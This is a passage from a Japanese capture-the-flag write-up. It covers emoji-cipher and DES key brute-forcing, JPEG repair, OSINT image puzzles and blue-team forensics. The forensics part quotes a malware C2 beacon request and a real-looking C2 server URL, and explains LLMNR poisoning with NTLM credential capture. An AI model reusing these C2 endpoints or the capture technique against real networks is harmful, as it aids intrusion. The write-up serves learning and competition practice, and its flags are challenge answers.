      enc\_byte = ((byte + (enc\_shift \oplus RANGE)) \bmod RANGE) + BASE
      \]
    - 結果が特定の予約領域に入る場合は、`ALTERNATIVE` を引いて有効な UTF-8 絵文字に調整します。
    - 特殊バイト（例えば改行）は絵文字に変換されず、そのまま出力されます。また、`idx` の計算に影響する長さ関連のカウンタを動かします。

- インデックスの循環と挙動解析

    - キーの使用位置は単純な `i % len(ENC_SECRET)` ではありません。
    - `i % ((len_num * len_times) if len_num > 0 else 1)` を使い、`len_num` と `len_times` は特定のバイトを通過したときにだけ変化します。
    - つまり暗号化は「段階的」に分かれており、特定の制御バイトに到達するとキーサイクルが変わります。
    - 最初の大きな絵文字の繰り返しパターン（`✅😢🙈😴` など）は、同じ平文バイトの繰り返しに対応しており、キーの位置を再構築するのに最適です。

- 復号ロジックの逆設計

    - 明文を復元するには、まず各絵文字を Unicode コードポイントに戻します。
    - もし代替領域に移動していれば `ALTERNATIVE` を加算して調整し、`BASE` を引いて `RANGE` 以前の値を得ます。
    - その後、同じ鍵バイトとシフト規則を使って数式を逆にします。
    - `% RANGE` があるため理論上は `0..77` の値しか復元できませんが、この問題ではフラグは有限の文字集合にマッピングされているため十分です。

- 繰り返し行から鍵を復元する

    - 最初の行は規則的な絵文字パターンの繰り返しで、事実上の既知平文です。
    - 同じ位置では同じ平文バイト、同じ絵文字コード、固定の `BASE` と `RANGE` がわかっています。
    - したがって各鍵バイトを逆算して 12 バイト鍵を得られます。

    `[49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]`
    この鍵は暗号文全体で周期的に繰り返されます。
    鍵がわかれば `flag.enc` を mod-78 平文列に戻せます。

- ASCII アートとフラグの復元

    - 出力は単一行フラグではなく、大きな ASCII アートでした。
    - 復元した文字と換行をそのまま出力すると、フラグを含むテキストが現れます。
    - 変換のポイントは：
      - 演算が可逆であること
      - 高度に繰り返された既知平文
      - 有限の文字空間によるモジュール演算の縮小
    - つまり「絵文字 + ビット演算」は自動的に安全になるわけではなく、単なる皮だけの古典暗号です。

        ```python
        from pathlib import Path
        from PIL import Image, ImageDraw, ImageFont

        BASE = 0x1F600
        RANGE = 0x4E
        ALTERNATIVE = 0x1CEFE
        KEY = [49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]

        VAL_TO_CHAR = {
            14: "\\",
            18: "`",
            32: " ",
            33: "!",
            39: "'",
            40: "(",
            41: ")",
            44: ",",
            45: "-",
            46: ".",
            47: "/",
            58: ":",
            60: "<",
        }

        def parse_encrypted_file(file_path):
            raw_data = Path(file_path).read_bytes()
            text = raw_data.decode("utf-8")

            tokens = []
            for char in text:
                if char == "\n":
                    tokens.append(("newline", 10))
                else:
                    codepoint = ord(char)
                    if codepoint < BASE:
                        codepoint += ALTERNATIVE
                    tokens.append(("char", codepoint - BASE))

            return tokens

        def build_index_sequence(tokens):
            line_length = 0
            line_count = 0
            index_list = []

            for i, (token_type, _) in enumerate(tokens):
                idx = i % (line_length * line_count) if line_length > 0 else 0
                index_list.append(idx)

                if token_type == "newline":
                    if line_length == 0:
                        line_length = i + 1
                    line_count += 1

            return index_list

        def decrypt_tokens(tokens, index_list):
            length = len(tokens)
            plaintext_mod = []

            for i, (token_type, value) in enumerate(tokens):
                if token_type == "newline":
                    plaintext_mod.append(10)
                    continue

                key_value = KEY[index_list[i] % len(KEY)]
                shift = (length - i) % 4
                decrypted_value = (value - (key_value << shift)) % RANGE
                plaintext_mod.append(decrypted_value)

            return plaintext_mod

        def convert_to_ascii_art(plaintext_mod):
            ascii_chars = []
            for value in plaintext_mod:
                if value == 10:
                    ascii_chars.append("\n")
                else:
                    ascii_chars.append(VAL_TO_CHAR.get(value, "?"))

            return "".join(ascii_chars)

        def render_ascii_art_to_image(ascii_text, output_path, font_size=16):
            lines = ascii_text.splitlines()

            try:
                font = ImageFont.truetype("consola.ttf", font_size)
            except Exception:
                try:
                    font = ImageFont.truetype("Courier New.ttf", font_size)
                except Exception:
                    font = ImageFont.load_default()

            max_line_length = max(len(line) for line in lines) if lines else 0
            char_width = font.getbbox("A")[2]
            line_height = font.getbbox("A")[3] + 2

            image_width = max_line_length * char_width + 10
            image_height = line_height * len(lines) + 10

            img = Image.new("RGB", (image_width, image_height), "white")
            draw = ImageDraw.Draw(img)

            y_position = 5
            for line in lines:
                draw.text((5, y_position), line, fill="black", font=font)
                y_position += line_height

            img.save(output_path)
            return output_path

        def main():
            input_file = Path(r"C:\Users\zenge\Downloads\files (6)\flag.enc")
            output_file = Path(r"C:\Users\zenge\Downloads\files (6)\ascii_art.webp")

            print("暗号ファイルを解析しています...")
            tokens = parse_encrypted_file(input_file)

            print("インデックスシーケンスを構築しています...")
            index_list = build_index_sequence(tokens)

            print("復号しています...")
            plaintext_mod = decrypt_tokens(tokens, index_list)

            print("ASCII アートに変換しています...")
            ascii_art = convert_to_ascii_art(plaintext_mod)

            print("画像をレンダリングしています...")
            result_path = render_ascii_art_to_image(ascii_art, output_file)

            print(f"完了！ 画像を保存しました: {result_path}")
            print("\nASCII アートのプレビュー:")
            print(ascii_art[:500] + "..." if len(ascii_art) > 500 else ascii_art)

        if __name__ == "__main__":
            main()
        ```
![image](/images/FhCTF/33.webp)

```
FhCTF{S1mpl3_FL46_We4k_P4ss}
```

### DES Lv.1 - 老船長の宝物
- Part 1: JPEG 高さ修復 (Image Forensics)

    - 問題の分析

        **対象ファイル**: `treasuremap.webp`
        **現象**: 画像の下部が切り取られており、完全な内容が見えない。
        **原因**: JPEG ヘッダ内の高さが悪意を持って変更されており、ビューアは上部のみを描画していて、下部の重要情報が隠されている。

    - コア原理

        JPEG 形式では SOF (Start of Frame) ブロックに画像サイズ情報が格納されます。

        **SOF マーカー**: `FF C0` (Baseline DCT) または `FF C2` (Progressive DCT)
        **構造**: `[FF C0] [長さ(2 バイト)] [精度(1 バイト)] [高さ(2 バイト)] [幅(2 バイト)]`
        **バイト順**: Big-endian

        高さが意図的に小さく設定されていると、ビューアはその高さを超えたピクセルを無視しますが、これらのデータはファイル内に残っています。高さを復元または大きくすれば、隠れた内容が表示されます。

    - スクリプト

        A. SOF マーカーを読み取り、検索します。

        ```python
        import re
        import struct

        with open("treasuremap.webp", "rb") as f:
            data = bytearray(f.read())

        # SOF マーカーをすべて検索 (FF C0 または FF C2)
        matches = [m.start() for m in re.finditer(b'\xff[\xc0\xc2]', data)]
        ```

        このステップでは画像サイズを定義するヘッダの位置を探します。JPEG にはサムネイルを含む場合があるため、複数の SOF ブロックが存在する可能性があります。

        B. メイン画像を特定します。

        ```python
        max_width = 0
        target_idx = -1

        for sof_pos in matches:
            h_idx = sof_pos + 5  # 高さの位置
            w_idx = sof_pos + 7  # 幅の位置

            h = struct.unpack(">H", data[h_idx:h_idx+2])[0]
            w = struct.unpack(">H", data[w_idx:w_idx+2])[0]

            if w > max_width:
                max_width = w
                target_idx = h_idx
        ```

        `>H` は JPEG 規格に合ったビッグエンディアンの unsigned short です。通常、メイン画像は最大幅を持ちます。

        C. 高さを変更して保存します。

        ```python
        new_height = 2000  # 十分に大きな高さを設定
        data[target_idx:target_idx+2] = struct.pack(">H", new_height)

        with open("treasuremap_fixed.jpg", "wb") as f:
            f.write(data)
        ```

        修復に成功すると、隠れていた情報が見えます。
        - `plaintext.enc` ファイルのヒント
        - 一部の鍵ヒント：`r5K9`

        ![{6ED9B10C-BFBE-4518-B8C4-EF7B5ABA8D9F}](/images/FhCTF/34.webp)
- Part 2: DES 鍵のブルートフォース (Cryptography)

    - 問題の背景

        **暗号アルゴリズム**: DES (Data Encryption Standard)
        **入力ファイル**: `plaintext.enc` (hex エンコードされた暗号文)
        **既知情報**:
        - 問題文に "The Data" があれば復号が速くなるとある
        - 地図の右下赤字に `key 部分：r5K9`

    - 暗号モードの判定

        `plaintext.enc` の特徴をチェックします：
        1. hex 文字列の長さが偶数 → bytes に変換できる
        2. 変換後の長さが 8 の倍数 → DES のブロックサイズに一致

        IV が提供されていないため、入門級 CTF 問題としては **DES-ECB モード** の可能性が高いです。

        **ECB の特性**：
        - IV を必要としない
        - 各ブロックが独立して暗号化/復号される
        - 同じ平文ブロックは同じ暗号文ブロックになる

    - 鍵構造の分析

        DES 鍵は 8 バイト固定です。
        既知の最初の 4 バイト：`r5K9`
        未知の後半 4 バイトをブルートフォースします。

        **文字集合**: 英数字 62 文字
        **組み合わせ数**: 62^4 = 14,776,336

- 加速戦略

    "The Data can help you decrypt faster" というヒントは次を意味します：
    - ファイル全体を復号する必要はない
    - 先頭の 8 バイトブロックだけ復号して鍵を検証する
    - 既知平文攻撃の考え方を使う

- 解法スクリプト

    ブルートフォース版

    ```python
    import binascii
    import itertools
    import string
    from Crypto.Cipher import DES

    with open("plaintext.enc", "rb") as f:
        ct_hex = f.read().strip()
    ct = binascii.unhexlify(ct_hex)

    prefix = b"r5K9"
    charset = (string.ascii_letters + string.digits).encode()
    ct0 = ct[:8]

    def is_printable(bs: bytes) -> bool:
        return all(32 <= b < 127 or b in (10, 13, 9) for b in bs)

    found = None
    for suf in itertools.product(charset, repeat=4):
        key = prefix + bytes(suf)
        cipher = DES.new(key, DES.MODE_ECB)
        pt0 = cipher.decrypt(ct0)

        if is_printable(pt0) and pt0.startswith(b"Here is"):
            found = key
            print(f"[+] Key found: {key.decode(errors='ignore')}")
            break

    if not found:
        print("[-] Key not found")
        exit()

    cipher = DES.new(found, DES.MODE_ECB)
    pt = cipher.decrypt(ct)

    pad = pt[-1]
    if 1 <= pad <= 8 and pt.endswith(bytes([pad]) * pad):
        pt = pt[:-pad]

    with open("plaintext.dec.txt", "wb") as f:
        f.write(pt)
    ```

    **実行結果**:
    ```
    [+] Key found: r5K9zXxv
    ```

    直接復号版

    ```python
    from Crypto.Cipher import DES
    import binascii

    with open("plaintext.enc", "rb") as f:
        data = binascii.unhexlify(f.read().strip())

    key = b"r5K9zXxv"
    cipher = DES.new(key, DES.MODE_ECB)
    plain = cipher.decrypt(data)

    pad = plain[-1]
    if 1 <= pad <= 8 and plain.endswith(bytes([pad]) * pad):
        plain = plain[:-pad]

    with open("plaintext.dec.txt", "wb") as f:
        f.write(plain)
    ```

    - 結果

    復号した `plaintext.dec.txt` の内容：

    ```
    Here is your reward for finding the right key:
    FhCTF{D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7}
    ```
```
FhCTF{D0n7_c0un7_7h3_d4y5_m4k3_7h3_d4y5_c0un7}
```

### DES Lv.2 – 老船長の宝物を再探訪 (Write-up)

- 問題の説明と手がかり整理

    問題のヒントは：

    * 暗号化データ `plaintext.enc`
    * 前問で鍵に現れた `r5K9zXxv`
    * 地図には `r5K9`, `A.D.1688`
    * そして **"The Data." は復号を速くする** と明示

    目標：暗号文を解読して GPS 座標かフラグを見つけること。

- 初期分析：暗号文の形式と DES の特徴

    `plaintext.enc` を入手したらまず形式を判断します。

    * ファイル内容は長い hex 文字列のように見える（`0-9a-f`）
    * したがって最初に `bytes.fromhex(...)` する必要がある
    * DES のブロックサイズは 8 バイトなので、暗号文長は 8 の倍数のはず

    コードでは次のように処理しているでしょう。

    ```python
    with open("plaintext.enc", "rb") as f:
        ct = bytes.fromhex(f.read().decode("ascii").strip())
    ```

- 攻撃戦略：モード/IV の推測と鍵構造のブルートフォース

    DES 問題でよくある罠は、鍵だけではなく次も重要です。

    * 使用モードは ECB / CBC / CFB / OFB など
    * CBC の IV は：
      * すべて 0 の固定値
      * ヒント文字列（例："The Data"）
      * 暗号文先頭の 8 バイトとして `IV || CIPHERTEXT`
    * 鍵は `r5K9????` とは限らず、`????r5K9` かもしれない

    そのため次の方針を取りました。

    - (A) いくつかのよくあるスキームを同時に試す

        `try_dump()` で次の 4 つを一度にテストします。

        1. CBC + IV = "The Data"
        2. CBC + IV = all zeros
        3. CBC + IV = ct[:8]（`IV||C` 形式の可能性）
        4. ECB（IV を不要とする）

        ```python
        schemes = [
            ("CBC_IV_TheData", DES.MODE_CBC, b"The Data", ct),
            ("CBC_IV_zeros",   DES.MODE_CBC, b"\x00"*8,  ct),
            ("CBC_IV_prefix",  DES.MODE_CBC, ct[:8],     ct[8:]),
            ("ECB",            DES.MODE_ECB, None,       ct),
        ]
        ```

    - (B) 鍵構造を複数試す

        `r5K9` があることと前問の完全鍵 `r5K9zXxv` から、鍵は固定 4 文字 + ブルートフォース 4 文字の可能性が高いと推測しました。

        次の 2 つのベースを試します。

        * `base = b"r5K9"`
        * `base = b"zXxv"`

        そして各ベースで 2 つの並べ方を試す。

        * `base + suf` → `r5K9????`
        * `suf + base` → `????r5K9`

    - (C) キー空間を制限する

        色々な記号を含めすぎると時間が爆発するため、一般的な CTF キー風の文字集合に絞りました。

        `a-zA-Z0-9` に `_ - ! @ # .` を追加

        すると概算検索空間は：

        * 文字集合長 ≈ 67
        * 4 文字 suffix → `67^4 ≈ 20,151,121`

- 全文を毎回復号しない高速フィルタ

    遅いのは「各鍵で全文を復号すること」です。そこで次の工夫を使います。

    - 先頭 64 バイトだけ復号してヘッドを確認
    - そのヘッドが有効そうかどうかだけで絞り込む

    2 つの判定基準：

    1. GPS 正規表現にマッチする
    2. 印字可能文字率が高い

    GPS 正規表現例：

    ```python
    gps_pat = re.compile(rb'[-+]?\d{1,3}\.\d{3,}\s*[, ]\s*[-+]?\d{1,3}\.\d{3,}')
    ```

    印字可能率：

    ```python
    def printable_ratio(b: bytes) -> float:
        good = sum(1 for x in b if x in b"\n\r\t" or 32 <= x <= 126)
        return good / len(b)
    ```

    `gps_pat.search(head)` がヒットするか、`printable_ratio(head) > 0.92` の場合に全文を復号します。

    さらにフラグパターンを検索します。

    ```python
    flag_pat = re.compile(rb'FhCTF\{[^}]{1,100}\}', re.I)
    ```

- 実行方法（Windows / PowerShell）

    - 依存ライブラリのインストール

    ```powershell
    python -m pip install pycryptodome
    ```

    - 実行

    ```powershell
    python slove.py
    ```

- 結果を待つ（少し時間がかかる可能性があります）

    キー候補が見つかると、プログラムは次を出力します。

    * 命中した key と scheme
    * head の最初 200 bytes
    * GPS / Flag があればそれ
    * plaintext の先頭 500 bytes

    出力例：

    ```
    *] brute forcing key structures...

    [+] HIT! key=b'r5K9bB2x'  scheme=CBC_IV_TheData
    [+] head: b'b4NKr3W8 Encryption Standard (DES) is a symmetric-key block ciph'
    [+] FLAG: b'FhCTF{23.257735309160896_119.66758643893687}'
    b'b4NKr3W8 Encryption Standard (DES) is a symmetric-key block cipher that operates on fixed-size blocks of data. DES processes data in 64-bit (8-byte) blocks and uses a 64-bit key, of which 56 bits are effective key material and the remaining 8 bits are used for parity checking. Because DES encrypts only one block at a time, it must be combined with a mode of operation to securely encrypt data longer than a single block.\r\n\r\nOne widely used mode is Cipher Block Chaining (CBC). In DES-CBC mode, each'
    ```
    ```
    FhCTF{23.257735309160896_119.66758643893687}
    ```

### 管理者のパスワードオニオン

3 レベルあります。

1. Level 1 は MD5 ハッシュ。オンラインツールで解いて `qwerty` を得ました。
2. Level 2 は SHA-1 でしたが、直感で `admin` を推測しました。
3. Level 3 は Base64 をデコードするだけで `FsCTF{Happy Day}` になります。

最後にフラグを取得します。
```
FhCTF{CrYpt0_W3b_M4st3r_2025}
```


## OSINT
### Art Work
画像が与えられました。
![image](/images/FhCTF/35.webp)
画像検索すると「風之籽」という作品が見つかり、111.11.04-112.02.05 の「2022 屏東落山風藝術季」で展示されていました。
```
FhCTF{屏東縣_落山風藝術季_1111104-1120205}
```

### Trace the Landmark
3 枚の写真が与えられました。
![photo-1](/images/FhCTF/36.webp)
![photo-2](/images/FhCTF/37.webp)
![photo-3](/images/FhCTF/38.webp)
3 枚目の写真を逆画像検索したところ、**Piazza della Rotonda** が見つかりました。
![image](/images/FhCTF/39.webp)
ヒントを整理すると次になります。
```
FhCTF{Piazza_della_Rotonda_00186_Roma_RM_Italy}
```

### 島1
この画像が与えられました。
![land-1](/images/FhCTF/40.webp)
モザイクがあっても「新_廟口餐廳」と推測できました。
Google 検索でレストランが見つかりました。
![image](/images/FhCTF/41.webp)
メニューと画像の料理を照合しました。
![37077136260_d855810352_c](/images/FhCTF/42.webp)
最終的な答えは元の画像の中央にある料理、**炒千佛手** です。
```
FhCTF{新大廟口活海鮮_炒千佛手}
```

### The FH Gift
最初に `malware_sample.eml` が出てきました。開くと次のような内容です。

![image](/images/FhCTF/43.webp)

`salary_adjustment.docx` は実際には Word ファイルではなく、偽装された ZIP アーカイブでした。マジックバイトを確認すると `PK\x03\x04` で始まっており、これは ZIP ファイルのシグネチャです。

![image](/images/FhCTF/44.webp)

```
FhCTF{M1M3_Typ3s_C4n_B3_D3c3pt1v3}
```

### ビジネスタイム 1
次の画像が与えられました。
![exhibition](/images/FhCTF/45.webp)

これを https://www.metadata2go.com/ に投げると次のデータが得られました。
![image](/images/FhCTF/46.webp)

description にウェブサイトがありました。
クリックすると展覧会サイトにリダイレクトされました。

![2026-01-03_14.35.58](/images/FhCTF/47.webp)

https://github.com/tschool-students/tschool-students.github.io が表示されました。

これは「臺北市數位實驗高級中等學校學習分享會」であるとわかりました。

![image](/images/FhCTF/48.webp)

日程は 2026.1.18 9:00 - 16:00 と 1.19 9:00 - 16:00 です。ISO 8601 形式にすると：
`2026-01-18T09:00_2026-01-19T16:00`

```
FhCTF{T-SCHOOL_STUDENTS_EXPO'26_2026-01-18T09:00_2026-01-19T16:00}
```

### ビジネスタイム 2
ビジネスタイム 1 から、会場の住所は `臺北市中山區吉林路110號` です。
Google Maps に住所を入れ、座標をコピーしました。

![截圖 2026-01-05 00.25.06](/images/FhCTF/49.webp)


### Lithium exploration
![SalardeUyuni](/images/FhCTF/50.webp)

AI に画像を投げました。

国：ボリビア
塩湖名：ウユニ塩湖（Salar de Uyuni）
採掘資源：リチウム

最初は間違っていましたが、後で問題が変更されて正解になりました。不思議です。

```
FhCTF{Bolivia_SalardeUyuni_Lithium}
```

### SRL
次の画像が与えられました。
![SRL](/images/FhCTF/51.webp)
右側に台北ドーム、背景に中正紀念堂と台北101が見えるので、場所を推測しました。
![image](/images/FhCTF/52.webp)

### 島2

```
清末民初の時代、人々は麻瘋病（ハンセン病）についてほとんど知らず、患者を隔離するために建功嶼に送って自生自滅させました。そのためこの島は「麻瘋礁」と呼ばれました。患者は島に隔離された後、金門本島を遠くから眺めるだけで、家に戻ることはできませんでした。
```

Google AI で検索しました。
![image](/images/FhCTF/53.webp)
![image](/images/FhCTF/54.webp)

### 美しいドーム 1

```danger
直感を使ってください
```

![image](/images/FhCTF/55.webp)

### 美しいドーム 2

`無料 船 フェリー トルコ` で検索すると、ターキッシュエアラインのこのページが見つかりました。

https://www.turkishairlines.com/zh-tw/flights/fly-different/touristanbul/

![截圖 2026-01-05 00.40.35](/images/FhCTF/56.webp)

Google Maps で目的地がボスポラス海峡付近であることが確認できました。

情報は次の通りです。
`T06 18:30-23:00`
ボスポラス海峡クルーズ（4 月 1 日から 10 月 31 日まで運航）

フラグ形式にすると：

```
FhCTF{1830-2300_0401-1031}
```

### ヘルメットなしライダー
![rider_without_helmet](/images/FhCTF/57.webp)

簡単な画像検索でメーカーと車種がわかり、いくつか試して答えが絞れました。
![image](/images/FhCTF/58.webp)

```
FhCTF{2014_Kymco_Many50}
```

### EXIF の「撮影座標」

この問題ではファイルに少し問題がありましたが、EXIF を完全に組み合わせると写真の緯度経度がわかりました。


## Blue team
### 大注文
1. 暗号化された 16 進数文字列: `775a20657e725a206725250925317172587b3774750d2132747f5a2631752251`
2. ネットワークパケットの hex dump。HTTP POST リクエストを示しています。

提供されたパケットを調べると、次の重要な情報がありました。

```
POST /api/v1/config HTTP/1.1
Host: 45.33.22.11
User-Agent: C2-Client/1.0
X-Auth-Token: FhCTF
Content-Type: application/x-binary

Target_ID: 775a20657e725a206725250925317172587b3774750d2132747f5a2631752251
```

`X-Auth-Token: FhCTF` から、`FhCTF` が `Target_ID` の暗号鍵として使われている可能性が高いと推測しました。

- Python で 16 進数文字列を XOR 復号する

```python
import binascii

hex_string = "775a20657e725a206725250925317172587b3774750d2132747f5a2631752251"
key = "FhCTF"

hex_bytes = bytes.fromhex(hex_string)
result = bytearray()
key_bytes = key.encode('ascii')

for i, byte in enumerate(hex_bytes):
    result.append(byte ^ key_bytes[i % len(key_bytes)])

print(result.decode('ascii'))
```

復号すると MD5 ハッシュ `12c1842c3ccafe7408c23ebf292ee3d9` が得られ、それを VirusTotal に提出しました。
![image](/images/FhCTF/59.webp)

VirusTotal の解析レポートから、このマルウェアの C2 通信先がわかりました。
- **C2 サーバ**: `http://171.22.28.221/5c06c05b7b34e8e6.php`

```
FhCTF{http://171.22.28.221/5c06c05b7b34e8e6.php}
```

### 🧩 User’s Bad Day
与えられた手がかりはパケットログで、次の 3 つを見つける必要がありました：ホスト名、アカウント名、ファイル名。そして指定された形式でフラグを組み立てる。

- DNS クエリからホスト名

    パケットの最初に次のような DNS クエリがあります。

    ```txt
    DNS Standard query A fulesrv.local
    ```

    これはターゲットホストが `fulesrv.local` であることを意味します。
    問題はドメイン名を含まないホスト名を求めているので、前半だけを使います。

    - ホスト名（ドメインを除く）：`fulesrv`

    ✅ ホスト名 = `fulesrv`

- DNS 失敗と LLMNR

    DNS が失敗すると、Windows は LLMNR を試みます。
    パケットには次のような内容が含まれています。

    ```txt
    LLMNR query A fulesrv
    ```

    これはシステムが "fulesrv は誰？" と問い合わせていることを示します。

- LLMNR Poisoning の「怪事」の原因

    この段階で、攻撃者のホスト（例：`192.168.50.200`）が fulesrv を装って応答し、被害者を攻撃者側に誘導します。
    これが典型的な **LLMNR poisoning** 攻撃です。

- NTLM 認証からアカウント名を取得

    SMB 認証では `NTLMSSP AUTHENTICATE_MESSAGE` パケットに Domain Name、User Name、Workstation Name が含まれます。
    パケット内の UTF-16LE 文字列をデコードすると、次のようになります。

    - Domain Name: `DOMAIN`
    - User Name: `Bob`
    - Workstation: `WORKST`

    問題が問うのは「攻撃者が傍受したアカウント名」です。つまり NTLM 認証のユーザー名です。

    ✅ アカウント名 = `Bob`

- SMB パケットからファイル名を復元

    続く SMB パケットに、ユーザーがアクセスしようとしたファイルパスやファイル名が含まれていました。問題は UTF-16LE エンコーディングに注意するように指示しています。
    16 進ダンプで次のようなバイト列が見えます。

    ```txt
    74 00 65 00 73 00 74 00
    ```

    これを UTF-16LE でデコードすると `test` になります。
    問題は拡張子を含まないファイル名を求めているので、たとえ実際のファイルが `test.txt` や `test.docx` でも、フラグには本体だけを使います。

    ✅ ファイル名 = `test`

指定された形式に当てはめると：

```
FhCTF{host_account_filename}
```

前の 3 つを代入します。

- host: `fulesrv`
- account: `Bob`
- file: `test`

最終フラグ：

```
FhCTF{fulesrv_Bob_test}
```
